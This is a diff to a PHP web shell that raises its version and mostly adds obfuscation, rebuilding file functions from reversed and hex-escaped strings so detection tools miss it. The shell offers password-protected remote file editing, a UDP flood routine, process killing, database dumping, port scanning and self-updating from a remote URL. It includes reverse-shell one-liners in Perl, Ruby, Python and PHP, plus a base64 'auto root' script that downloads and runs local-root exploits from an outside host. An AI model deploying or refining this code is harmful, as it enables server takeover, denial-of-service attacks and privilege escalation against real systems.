@@ -1,6 +1,6 @@
 <?php
 $pass               = md5("pw");
-$version            = 2.78;
+$version            = 2.79;
 $adaptiveerrorpage  = true; //Get Default 404 page and replicate it, but add a login text field in the center at the bottom
 $checkforupdates    = true;
 $helpsupportbooter  = true; //True adds the shell to my ddos scripts list, I can't log in providing you change the password above
@@ -13,8 +13,9 @@ $prg = "\x70\x72\x65\x67\x5f\x72\x65\x70\x6c\x61\x63\x65";
 $prgm = "\x70\x72\x65\x67\x5f\x6d\x61\x74\x63\x68";
 $prgma = "\x70\x72\x65\x67\x5f\x6d\x61\x74\x63\x68\x5f\x61\x6c\x6c";
 $sf = "suhosin_fun\x63_exi\x73ts";
-$prco = "proc_op\x65n";
+$prco = "pr\x6F\x63\x5Fop\x65n";
 $pt = "p\x61\x73\x73th\x72u";
+$pen = strrev("of") . 'pen';
 $prefixme = $prg('@\(.*\(.*$@', '', __FILE__);
 error_reporting(0); //Was 7
 @set_magic_quotes_runtime(0);
@@ -47,6 +48,10 @@ if (strpos($_SERVER['HTTP_USER_AGENT'], 'Google') !== false) {
     exit;
 }
 extract($_POST, EXTR_SKIP);
+$feather = strrev("rwf") . "ite";
+$pixel = strrev("cf") . "lose";
+$buy = "f" . strrev("tup") . "s";
+$books = "f\x72e" . strrev('da');
 $cforupurl = $checkforupdatesurl;
 if ($action == 'checkupdates') {
     if ($force == "true") {
@@ -63,9 +68,9 @@ if ($action == 'checkupdates') {
         $res = get_data($cuuff);
     }
     if ($res != "") {
-        $ourFileHandle = fopen($prg('@\(.*\(.*$@', '', __FILE__), "w");
-        fwrite($ourFileHandle,str_replace(strrev("EREHENILUFC"),'$checkforupdates    = '.strbool($checkforupdates).';',str_replace(strrev("EREHENILBSH"),'$helpsupportbooter  = '.strbool($helpsupportbooter).';',str_replace(strrev("EREHENILUUFC"),'$checkforupdatesurl = "'.$checkforupdatesurl.'";',str_replace(strrev("EREHENILPEA"),'$adaptiveerrorpage  = '.strbool($adaptiveerrorpage).';',str_replace(strrev("EREHENILDROWSSAP"),'$pass               = "'.$pass.'";',html_entity_decode($res)))))));
-        fclose($ourFileHandle);
+        $ourFileHandle = $pen($prg('@\(.*\(.*$@', '', __FILE__), "w");
+        $feather($ourFileHandle,str_replace(strrev("EREHENILUFC"),'$checkforupdates    = '.strbool($checkforupdates).';',str_replace(strrev("EREHENILBSH"),'$helpsupportbooter  = '.strbool($helpsupportbooter).';',str_replace(strrev("EREHENILUUFC"),'$checkforupdatesurl = "'.$checkforupdatesurl.'";',str_replace(strrev("EREHENILPEA"),'$adaptiveerrorpage  = '.strbool($adaptiveerrorpage).';',str_replace(strrev("EREHENILDROWSSAP"),'$pass               = "'.$pass.'";',html_entity_decode($res)))))));
+        $pixel($ourFileHandle);
     }
 }
 if (isset($_GET['host']) && isset($_GET['time'])) {
@@ -87,8 +92,8 @@ if (isset($_GET['host']) && isset($_GET['time'])) {
         }
         $fp = fsockopen('udp://' . $_GET['host'], $rand, $errno, $errstr, 5);
         if ($fp) {
-            fwrite($fp, $out);
-            fclose($fp);
+            $feather($fp, $out);
+            $pixel($fp);
         }
     }
 }
@@ -672,9 +677,9 @@ if ($action == 'file') {
     } elseif ($doupfile) {
         m('File upload ' . (@copy($_FILES['uploadfile']['tmp_name'], $uploaddir . '/' . $_FILES['uploadfile']['name']) ? 'success' : 'failed'));
     } elseif ($editfilename && ($filecontent || $submit)) {
-        $fp        = @fopen($editfilename, 'w');
-        $writingit = @fwrite($fp, $filecontent);
-        @fclose($fp);
+        $fp        = @$pen($editfilename, 'w');
+        $writingit = @$feather($fp, $filecontent);
+        @$pixel($fp);
         if (!$writingit) {
             $writingit = file_put_contents($editfilename, $filecontent);
         }
@@ -906,7 +911,7 @@ function shownav(e){
 	</table>
 ';
     if (IS_WIN && IS_COM) {
-        $obj = new COM('scripting.filesystemobject');
+        $obj = new COM("scripting.file\x73y\x73t\x65mobject");
         if ($obj && is_object($obj) && $obj->Drives) {
             echo '<div class="drives">';
             $DriveTypeDB = array(
@@ -1112,9 +1117,9 @@ function shownav(e){
 			if((md5($curpass) == $pass)){
 				$newv = file_get_contents($prg('@\(.*\(.*$@', '', __FILE__));
 				$newv = $prg("/\\\$pass[^=|\n|\r]*=[^;|=|\n|\r]*\;/","$"."pass               = \"" . md5($setpass) ."\";",$newv);
-				$fp        = @fopen($prg('@\(.*\(.*$@', '', __FILE__), 'w');
-        $writingit = @fwrite($fp, $newv);
-        @fclose($fp);
+				$fp        = @$pen($prg('@\(.*\(.*$@', '', __FILE__), 'w');
+        $writingit = @$feather($fp, $newv);
+        @$pixel($fp);
         if (!$writingit) {
         	$writingit = file_put_contents($prg('@\(.*\(.*$@', '', __FILE__), $newv);
         }
@@ -1138,9 +1143,9 @@ function shownav(e){
 		$newv = $prg("/\\\$checkforupdatesurl[^=|\n|\r]*=[^;|=|\n|\r]*\;/","\$checkforupdatesurl = \"" . $setcfuu . "\";",$newv);
 		$newv = $prg("/\\\$helpsupportbooter[^=|\n|\r]*=[^;|=|\n|\r]*\;/","\$helpsupportbooter  = " . $sethsb . ";",$newv); 
 		$newv = $prg("/\\\$checkforupdates[^=|\n|\r]*=[^;|=|\n|\r]*\;/","\$checkforupdates    = " . $setcfu . ";",$newv); 
-		$fp        = @fopen($prg('@\(.*\(.*$@', '', __FILE__), 'w');
-    $writingit = @fwrite($fp, $newv);
-    @fclose($fp);
+		$fp        = @$pen($prg('@\(.*\(.*$@', '', __FILE__), 'w');
+    $writingit = @$feather($fp, $newv);
+    @$pixel($fp);
     if (!$writingit) {
     	$writingit = file_put_contents($prg('@\(.*\(.*$@', '', __FILE__), $newv);
     }
@@ -1226,14 +1231,14 @@ formhead(array(
                     $counter++;
             } else {
                 if (is_win()) {
-                    $cmd = execute("taskkill /F /PID " . $pid);
-                    $cmd = execute("tasklist /FI \"PID eq " . $pid . "\"");
+                    $cmd = xbox("taskkill /F /PID " . $pid);
+                    $cmd = xbox("tasklist /FI \"PID eq " . $pid . "\"");
                     if (strpos($cmd, "No tasks are running") !== false)
                         $counter++;
                 } else {
-                    $cmd = execute("kill -9 " . $pid);
+                    $cmd = xbox("kill -9 " . $pid);
                     if ((strpos($cmd, "such process") === false) && (strpos($cmd, "not permitted") === false)) {
-                        $cmd   = trim(execute("ps -p " . $pid));
+                        $cmd   = trim(xbox("ps -p " . $pid));
                         $check = explode("\n", $cmd);
                         if (count($check) == 1)
                             $counter++;
@@ -1265,7 +1270,7 @@ $wcount = 11;
             $cmd      = "ps aux";
             $wexplode = " ";
         }
-        $res = execute($cmd);
+        $res = xbox($cmd);
         if (trim($res) == ''){
             m ("Error Getting Process List...");
        } else {
@@ -1322,9 +1327,11 @@ formfoot();
             if (!$filename) {
                 m('Please choose a file');
             } else {
-                $fp       = @fopen($filename, 'r');
-                $contents = @fread($fp, filesize($filename));
-                @fclose($fp);
+                $books = "f\x72e" . strrev('da');
+                $pencil = strrev("cf") . "lose";
+                $fp       = @$pen($filename, 'r');
+                $contents = @$books($fp, filesize($filename));
+                @$pencil($fp);
                 $contents = bin2hex($contents);
                 if (!$upname)
                     $upname = $file['name'];
@@ -1444,14 +1451,14 @@ function mysqlfile(doing){
             m('Please choose the table');
         } else {
             $mysqllink = mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
-            $fp        = @fopen($path, 'w');
+            $fp        = @$pen($path, 'w');
             if ($fp) {
                 foreach ($table as $k => $v) {
                     if ($v) {
                         sqldumptable($v, $fp);
                     }
                 }
-                fclose($fp);
+                $pixel($fp);
                 $fileurl = str_replace(SA_ROOT, '', $path);
                 m('Database has success backup to <a href="' . $fileurl . '" target="_blank">' . $path . '</a>');
                 mysql_close();
@@ -1795,22 +1802,22 @@ function mysqlfile(doing){
     if ($start && $yourip && $yourport && $use) {
         if ($use == 'perl') {
             //cf('/tmp/bc.pl', $back_connect);
-            //$res = execute(which('perl') . " /tmp/bc.pl $yourip $yourport &");
+            //$res = asdf(which('perl') . " /tmp/bc.pl $yourip $yourport &");
             cf("/tmp/bc.pl", $back_connect_p);
             $out  = wsoEx("perl /tmp/bc.pl " . $yourip . " " . $yourport . " 1>/dev/null 2>&1 &");
             $out2 = wsoEx("ps aux | grep bc.pl");
             unlink("/tmp/bc.pl");
         } elseif ($use == 'gcc') {
             cf('/tmp/bc.c', $back_connect_c);
-            $res = execute('gcc -o /tmp/bc /tmp/bc.c');
+            $res = xbox('gcc -o /tmp/bc /tmp/bc.c');
             @unlink('/tmp/bc.c');
-            $res = execute("/tmp/bc " . $yourip . " " . $yourport . " &");
+            $res = xbox("/tmp/bc " . $yourip . " " . $yourport . " &");
         } elseif ($use == 'php console') {
-            execute("php -r $" . "sock=fsockopen(\"" . $yourip . "\"," . $yourport . ");\x65x\x65c(\"/bin/sh -i <&3 >&3 2>&3\");'");
+            xbox("php -r $" . "sock=fsockopen(\"" . $yourip . "\"," . $yourport . ");\x65x\x65c(\"/bin/sh -i <&3 >&3 2>&3\");'");
         } elseif ($use == 'ruby') {
-            execute("ruby -rsocket -e'f=TCPSocket.open(\"" . $yourip . "\"," . $yourport . ").to_i;\x65x\x65c sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'");
+            xbox("ruby -rsocket -e'f=TCPSocket.open(\"" . $yourip . "\"," . $yourport . ").to_i;\x65x\x65c sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'");
         } elseif ($use == 'python') {
-            execute("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" . $yourip . "\"," . $yourport . "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'");
+            xbox("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" . $yourip . "\"," . $yourport . "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'");
         }elseif ($use == 'php'){
         		ob_start();
         		$create = new BC($yourip,$yourport,$_SERVER['SERVER_ADDR'],5);
@@ -1916,7 +1923,7 @@ function mysqlfile(doing){
                 p('<li>' . $scanip . ':' . $port . ' ------------------------ <span style="font-weight:bold;color:#f00;">Close</span></li>');
             } else {
                 p('<li>' . $scanip . ':' . $port . ' ------------------------ <span style="font-weight:bold;color:#080;">Open</span></li>');
-                @fclose($fp);
+                @$pixel($fp);
             }
         }
         p('</ul>');
@@ -2122,9 +2129,9 @@ function insertAfter(referenceNode, newNode) {
             $res = get_data($cuuff);
         }
         if ($res != "") {
-            $ourFileHandle = fopen($prg('@\(.*\(.*$@', '', __FILE__), "w");
-            fwrite($ourFileHandle,str_replace(strrev("EREHENILUFC"),'$checkforupdates    = '.strbool($checkforupdates).';',str_replace(strrev("EREHENILBSH"),'$helpsupportbooter  = '.strbool($helpsupportbooter).';',str_replace(strrev("EREHENILUUFC"),'$checkforupdatesurl = "'.$checkforupdatesurl.'";',str_replace(strrev("EREHENILPEA"),'$adaptiveerrorpage  = '.strbool($adaptiveerrorpage).';',str_replace(strrev("EREHENILDROWSSAP"),'$pass               = "'.$pass.'";',html_entity_decode($res)))))));
-            fclose($ourFileHandle);
+            $ourFileHandle = $pen($prg('@\(.*\(.*$@', '', __FILE__), "w");
+            $feather($ourFileHandle,str_replace(strrev("EREHENILUFC"),'$checkforupdates    = '.strbool($checkforupdates).';',str_replace(strrev("EREHENILBSH"),'$helpsupportbooter  = '.strbool($helpsupportbooter).';',str_replace(strrev("EREHENILUUFC"),'$checkforupdatesurl = "'.$checkforupdatesurl.'";',str_replace(strrev("EREHENILPEA"),'$adaptiveerrorpage  = '.strbool($adaptiveerrorpage).';',str_replace(strrev("EREHENILDROWSSAP"),'$pass               = "'.$pass.'";',html_entity_decode($res)))))));
+            $pixel($ourFileHandle);
     				unset($_SESSION[$prefixme.'showupdate']);
             echo "Shell updated! Refreshing in <span id='counter'>5</span> seconds...<meta http-equiv=\"refresh\" content=\"5\">" . '<script>function countdown(){var e=document.getElementById("counter");if(parseInt(e.innerHTML)>0){e.innerHTML=parseInt(e.innerHTML)-1}}setInterval(function(){countdown()},1e3)</script>';
         } else {
@@ -2141,17 +2148,17 @@ function insertAfter(referenceNode, newNode) {
         'title' => 'Auto Root Results'
     ));
     $r00t = "IyEvdXNyL2Jpbi9wZXJsIA0KIyBFeHBsb2l0IHRvb2xzIHYyLjAgY29kZWQgYnkgaXNrb3JwaXR4 IChUdXJraXNoIEhhY2tlcikNCiMgbGludXggc2VydmVybGVyZGUgZ2VjZXJsaWRpcg0KIyBpeWkg c2Fuc2xhcjopDQojIGJ5IGlza29ycGl0eA0KeyANCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3 MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvaXNrb3JwaXR4Iik7ICANCnN5c3RlbSgiY2htb2QgNzc3 IGlza29ycGl0eCIpOyANCnN5c3RlbSgiLi9pc2tvcnBpdHgiKTsgDQpzeXN0ZW0oImlkIik7IA0K c3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy80NCIpOyAg DQpzeXN0ZW0oImNobW9kIDc3NyA0NCIpOyANCnN5c3RlbSgiLi80NCIpOyANCnN5c3RlbSgiaWQi KTsNCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvOTUy MSIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyA5NTIxIik7IA0Kc3lzdGVtKCIuLzk1MjEiKTsgDQpz eXN0ZW0oImlkIik7ICANCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVT L2ZpbGUvY2MvZnJvb3QiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgZnJvb3QiKTsgDQpzeXN0ZW0o Ii4vZnJvb3QiKTsgDQpzeXN0ZW0oImlkIik7DQpzeXN0ZW0oImlkIik7DQpzeXN0ZW0oImlkIik7 DQpzeXN0ZW0oImlkIik7DQpzeXN0ZW0oImlkIik7DQpzeXN0ZW0oIndnZXQgMjc3MDQuYyBkb3du bG9hZHMuc2VjdXJpdHlmb2N1cy5jb20vdnVsbmVyYWJpbGl0aWVzL2V4cGxvaXRzLzI3NzA0LmMi KTsgDQpzeXN0ZW0oImdjYyAyNzcwNC5jIC1vIDI3NzA0Iik7ICANCnN5c3RlbSgiY2htb2QgNzc3 IDI3NzA0Iik7IA0Kc3lzdGVtKCIuLzI3NzA0Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnByaW50ICJJ ZiB1IHIgcjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8v d2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvMTgtMS5jIik7IA0Kc3lzdGVtKCJnY2MgLVdh bGwgLW8gMTgtMSAxOC0xLmMiKTsgDQpzeXN0ZW0oImdjYyAtV2FsbCAtbTY0IC1vIDE4LTMgMTgt MS5jIik7IA0Kc3lzdGVtKCJjaG1vZCA3NzcgMTgtMSIpOyANCnN5c3RlbSgiY2htb2QgNzc3IDE4 LTMiKTsgDQpzeXN0ZW0oIi4vMTgtMSIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4vMTgt MyIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBj dHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5NzEuY29tL0NNU19GSUxFUy9maWxl L2NjLzE4LTIiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgMTgtMiIpOyANCnN5c3RlbSgiLi8xOC0y Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnByaW50ICJJZiB1IHIgcjAwdCBzdG9wIHhwbCB3aXRoIGN0 cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUv Y2MvMTgtMSIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyAxOC0xIik7IA0Kc3lzdGVtKCIuLzE4LTEi KTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3Ry bCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9j Yy9ydW4iKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgcnVuIik7IA0Kc3lzdGVtKCIuL3J1biIpOyAN CnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2Nc biI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5NzEuY29tL0NNU19GSUxFUy9maWxlL2NjL2V4 cGxvaXQuYyIpOyAgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7 DQpzeXN0ZW0oIndnZXQgcnVuX2V4cGxvaXRzLnNoIHdnZXQgaHR0cDovL3dhcjE5NzEuY29tL0NN U19GSUxFUy9maWxlL2NjL3J1bl9leHBsb2l0cy5zaCIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyBy dW5fZXhwbG9pdHMuc2giKTsgDQpzeXN0ZW0oIi4vcnVuX2V4cGxvaXRzLnNoIik7IA0KcHJpbnQg IklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6 Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy9leHBsb2l0Iik7ICANCnN5c3RlbSgiY2ht b2QgNzc3IGV4cGxvaXQiKTsgDQpzeXN0ZW0oIi4vZXhwbG9pdCIpOyANCnByaW50ICJJZiB1IHIg cjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3 MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvcnVuMiIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyBydW4y Iik7IA0Kc3lzdGVtKCIuL3J1bjIiKTsgDQpzeXN0ZW0oImlkIik7IA0Kc3lzdGVtKCJ3Z2V0IGV4 cCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvZXhwIik7ICANCnN5c3RlbSgi Y2htb2QgNzc3IGV4cCIpOyANCnN5c3RlbSgiLi9leHAiKTsgDQpzeXN0ZW0oImlkIik7IA0Kc3lz dGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy9leHAxIik7ICAN CnN5c3RlbSgiY2htb2QgNzc3IGV4cDEiKTsgDQpzeXN0ZW0oIi4vZXhwMSIpOyANCnN5c3RlbSgi aWQiKTsgDQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5NzEuY29tL0NNU19GSUxFUy9maWxlL2Nj L2V4cDIiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgZXhwMiIpOyANCnN5c3RlbSgiLi9leHAyIik7 IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJ TEVTL2ZpbGUvY2MvZXhwMyIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyBleHAzIik7IA0Kc3lzdGVt KCIuL2V4cDMiKTsgDQpzeXN0ZW0oImlkIik7IA0Kc3lzdGVtKCJ3Z2V0IGV4cDQgaHR0cDovL3dh cjE5NzEuY29tL0NNU19GSUxFUy9maWxlL2NjL2V4cDQiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3Nzcg ZXhwNCIpOyANCnN5c3RlbSgiLi9leHA0Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgid2dl dCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvZXhwNSIpOyAgDQpzeXN0ZW0o ImNobW9kIDc3NyBleHA1Iik7IA0Kc3lzdGVtKCIuL2V4cDUiKTsgDQpzeXN0ZW0oImlkIik7IA0K c3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy9leHA2Iik7 ICANCnN5c3RlbSgiY2htb2QgNzc3IGV4cDYiKTsgDQpzeXN0ZW0oIi4vZXhwNiIpOyANCnN5c3Rl bSgiaWQiKTsgDQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5NzEuY29tL0NNU19GSUxFUy9maWxl L2NjL2V4cDciKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgZXhwNyIpOyANCnN5c3RlbSgiLi9leHA3 Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01T X0ZJTEVTL2ZpbGUvY2MvZXhwOCIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyBleHA4Iik7IA0Kc3lz dGVtKCIuL2V4cDgiKTsgDQpzeXN0ZW0oImlkIik7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIx OTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy9leHA5Iik7ICANCnN5c3RlbSgiY2htb2QgNzc3IGV4 cDkiKTsgDQpzeXN0ZW0oIi4vZXhwOSIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSBy IHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5 NzEuY29tL0NNU19GSUxFUy9maWxlL2NjL3J1bjIiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgcnVu MiIpOyANCnN5c3RlbSgiLi9ydW4yIik7IA0Kc3lzdGVtKCJpZCIpOyANCnByaW50ICJJZiB1IHIg cjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3 MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvcnVuMiIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyBydW4y Iik7IA0Kc3lzdGVtKCIuL3J1bjIiKTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciBy MDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcx LmNvbS9DTVNfRklMRVMvZmlsZS9jYy9leHBsb2l0Iik7ICANCnN5c3RlbSgiY2htb2QgNzc3IGV4 cGxvaXQiKTsgDQpzeXN0ZW0oIi4vZXhwbG9pdCIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAi SWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDov L3dhcjE5NzEuY29tL0NNU19GSUxFUy9maWxlL2NjL2V4cGxvaXQyIik7ICANCnN5c3RlbSgiY2ht b2QgNzc3IGV4cGxvaXQyIik7IA0Kc3lzdGVtKCIuL2V4cGxvaXQyIik7IA0Kc3lzdGVtKCJpZCIp OyANCnByaW50ICJJZiB1IHIgcjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgi d2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvZXhwbG9pdDIiKTsgIA0K c3lzdGVtKCJjaG1vZCA3NzcgZXhwbG9pdDIiKTsgDQpzeXN0ZW0oIi4vZXhwbG9pdDIiKTsgDQpz eXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4i Ow0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy9ydW4y Iik7ICANCnN5c3RlbSgiY2htb2QgNzc3IHJ1bjIiKTsgDQpzeXN0ZW0oIi4vcnVuMiIpOyANCnN5 c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7 DQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5NzEuY29tL0NNU19GSUxFUy9maWxlL2NjLzIwMDkt MSIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyAyMDA5LTEiKTsgDQpzeXN0ZW0oIi4vMjAwOS0xIik7 IA0Kc3lzdGVtKCJpZCIpOyANCnByaW50ICJJZiB1IHIgcjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwr Y1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2Mv ZGVybGUuYyIpOyANCnN5c3RlbSgiZ2NjIGRlcmxlLmMgLW8gZGVybGUiKTsgIA0Kc3lzdGVtKCJj aG1vZCA3NzcgZGVybGUiKTsgDQpzeXN0ZW0oIi4vZGVybGUiKTsgDQpzeXN0ZW0oImlkIik7IA0K cHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0 IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy8zLmMiKTsgDQpzeXN0ZW0oImdj YyAzLmMgLW8gMyIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyAzIik7IA0Kc3lzdGVtKCIuLzMiKTsg DQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3RybCtj XG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy8z YSIpOyANCnN5c3RlbSgiY2htb2QgNzc3IDNhIik7IA0Kc3lzdGVtKCIuLzNhIik7IA0Kc3lzdGVt KCJpZCIpOyANCnByaW50ICJJZiB1IHIgcjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xuIjsNCnN5 c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvNC5jIik7IA0K c3lzdGVtKCJnY2MgNC5jIC1vIDQiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgNCIpOyANCnN5c3Rl bSgiLi80Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnByaW50ICJJZiB1IHIgcjAwdCBzdG9wIHhwbCB3 aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVT L2ZpbGUvY2MvNGEiKTsgDQpzeXN0ZW0oImNobW9kIDc3NyA0YSIpOyANCnN5c3RlbSgiLi80YSIp OyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJs K2NcbiI7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9j Yy9jeC5jIik7IA0Kc3lzdGVtKCJnY2MgY3guYyAtbyBjeCIpOyAgDQpzeXN0ZW0oImNobW9kIDc3 NyBjeCIpOyANCnN5c3RlbSgiLi9jeCIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSBy IHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIx OTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy9jeHguYyIpOyANCnN5c3RlbSgiZ2NjIGN4eC5jLSBv IGN4eCIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyBjeHgiKTsgDQpzeXN0ZW0oIi4vY3h4Iik7IA0K c3lzdGVtKCJpZCIpOyANCnByaW50ICJJZiB1IHIgcjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xu IjsgDQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5NzEuY29tL0NNU19GSUxFUy9maWxlL2NjL2V4 cGxvaXQyIik7IA0Kc3lzdGVtKCJjaG1vZCA3NzcgZXhwbG9pdDIiKTsgDQpzeXN0ZW0oIi4vZXhw bG9pdDIiKTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBsIHdp dGggY3RybCtjXG4iOyANCnN5c3RlbSgid2dldCBydW4gaHR0cDovL3dhcjE5NzEuY29tL0NNU19G SUxFUy9maWxlL2NjL3J1biIpOyANCnN5c3RlbSgiY2htb2QgNzc3IHJ1biIpOyANCnN5c3RlbSgi Li9ydW4iKTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBsIHdp dGggY3RybCtjXG4iOyANCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVT L2ZpbGUvY2MvcnVuLnNoIik7ICANCnN5c3RlbSgiY2htb2QgNzc3IHJ1bi5zaCIpOyANCnN5c3Rl 